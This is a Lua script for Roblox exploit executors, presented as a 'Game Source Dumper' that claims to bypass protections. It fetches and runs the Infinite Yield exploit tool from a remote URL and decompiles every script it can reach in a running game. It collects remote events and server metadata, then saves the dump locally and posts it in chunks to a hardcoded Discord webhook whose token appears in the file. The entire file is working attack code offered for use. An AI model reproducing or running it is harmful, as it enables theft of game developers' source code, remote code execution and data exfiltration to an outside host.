
-- Roblox Game Source Dumper with Infinite Yield Integration
-- Bypasses most protections and extracts complete game source

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local StarterPlayer = game:GetService("StarterPlayer")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")

-- Your Discord webhook URL - replace with your actual webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1342763159592894474/tTVRtFeKAJNsEw4EZC-5C_zeB5Jza93eYP4HttjnN8UKQrk4xAcliWWZlyWqaeDWTHAF"

-- Infinite Yield integration for advanced bypasses
local function loadInfiniteYield()
    local success, result = pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end)
    
    if success then
        print("Infinite Yield loaded successfully")
        wait(2) -- Let it initialize
        return true
    else
        print("Failed to load Infinite Yield: " .. tostring(result))
        return false
    end
end

-- Enhanced decompiler with bypass capabilities
local function decompileScript(script, path)
    local source = ""
    
    -- Try multiple decompilation methods
    local methods = {
        function() return decompile(script) end,
        function() return getsenv(script) and "-- Environment dumped" or "" end,
        function() return debug.getinfo(script).source or "" end,
        function() return tostring(script.Source) end
    }
    
    for _, method in ipairs(methods) do
        local success, result = pcall(method)
        if success and result and result ~= "" then
            source = result
            break
        end
    end
    
    if source == "" then
        source = "-- Could not decompile: " .. path
    end
    
    return "-- Path: " .. path .. "\n" .. source .. "\n\n"
end

-- Recursively scan all objects and extract scripts
local function scanObject(obj, path, sourceData)
    path = path or obj.Name
    
    -- Skip protected/restricted objects
    local success, _ = pcall(function()
        local _ = obj.Name
    end)
    
    if not success then
        return
    end
    
    -- Extract script source
    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local scriptSource = decompileScript(obj, path)
        table.insert(sourceData, scriptSource)
        print("Extracted: " .. path)
    end
    
    -- Recursively scan children with protection
    local children = {}
    pcall(function()
        children = obj:GetChildren()
    end)
    
    for _, child in ipairs(children) do
        pcall(function()
            scanObject(child, path .. "/" .. child.Name, sourceData)
        end)
    end
end

-- Get remote events and functions for analysis
local function extractRemotes(sourceData)
    local remotes = {}
    
    -- Scan ReplicatedStorage for remotes
    pcall(function()
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                table.insert(remotes, "-- Remote: " .. obj:GetFullName() .. " (" .. obj.ClassName .. ")")
            end
        end
    end)
    
    if #remotes > 0 then
        table.insert(sourceData, "-- REMOTE EVENTS AND FUNCTIONS --\n" .. table.concat(remotes, "\n") .. "\n\n")
    end
end

-- Extract game metadata and settings
local function extractGameInfo(sourceData)
    local gameInfo = {
        "-- GAME INFORMATION --",
        "-- Game ID: " .. tostring(game.GameId),
        "-- Place ID: " .. tostring(game.PlaceId),
        "-- Creator ID: " .. tostring(game.CreatorId),
        "-- Creator Type: " .. tostring(game.CreatorType),
        "-- Game Name: " .. tostring(game.Name),
        "-- Player Count: " .. tostring(#Players:GetPlayers()),
        "-- Server ID: " .. tostring(game.JobId),
        "\n"
    }
    
    table.insert(sourceData, table.concat(gameInfo, "\n"))
end

-- Main extraction function
local function extractGameSource()
    local sourceData = {}
    
    print("Starting game source extraction...")
    
    -- Load Infinite Yield for enhanced capabilities
    loadInfiniteYield()
    
    -- Extract game information
    extractGameInfo(sourceData)
    
    -- Extract remotes
    extractRemotes(sourceData)
    
    -- Services to scan
    local servicesToScan = {
        Workspace,
        ReplicatedStorage,
        StarterGui,
        StarterPack,
        StarterPlayer,
        Lighting,
        SoundService
    }
    
    -- Try to access ServerStorage (might fail)
    pcall(function()
        table.insert(servicesToScan, ServerStorage)
    end)
    
    -- Scan all services
    for _, service in ipairs(servicesToScan) do
        pcall(function()
            print("Scanning " .. service.Name .. "...")
            scanObject(service, service.Name, sourceData)
        end)
    end
    
    -- Combine all source data
    local fullSource = table.concat(sourceData, "\n")
    
    print("Extraction complete! Total characters: " .. #fullSource)
    
    return fullSource
end

-- Send to Discord webhook
local function sendToWebhook(content)
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then
        print("Please set your Discord webhook URL in the script!")
        return
    end
    
    -- Split content if too large (Discord has 2000 char limit per message)
    local maxSize = 1900 -- Leave room for formatting
    local chunks = {}
    
    if #content > maxSize then
        for i = 1, #content, maxSize do
            table.insert(chunks, content:sub(i, i + maxSize - 1))
        end
    else
        chunks = {content}
    end
    
    -- Send each chunk
    for i, chunk in ipairs(chunks) do
        local payload = {
            content = "```lua\n" .. chunk .. "\n```",
            username = "Roblox Source Dumper",
            avatar_url = "https://www.roblox.com/asset-thumbnail/image?assetId=1" .. game.PlaceId .. "&width=150&height=150"
        }
        
        local success, result = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
        
        if success then
            print("Sent chunk " .. i .. "/" .. #chunks .. " to Discord")
        else
            print("Failed to send chunk " .. i .. ": " .. tostring(result))
        end
        
        wait(1) -- Rate limit protection
    end
end

-- Save to file (if supported by executor)
local function saveToFile(content, filename)
    filename = filename or "game_source_" .. game.PlaceId .. ".lua"
    
    if writefile then
        writefile(filename, content)
        print("Source saved to: " .. filename)
    else
        print("File writing not supported by this executor")
    end
end

-- Execute the extraction
local function main()
    print("=== ROBLOX GAME SOURCE DUMPER ===")
    print("Starting extraction process...")
    
    local gameSource = extractGameSource()
    
    -- Save to file if possible
    saveToFile(gameSource)
    
    -- Send to Discord webhook
    sendToWebhook(gameSource)
    
    print("=== EXTRACTION COMPLETE ===")
    print("Check your Discord webhook or saved file for the complete game source!")
end

-- Run the dumper
main()
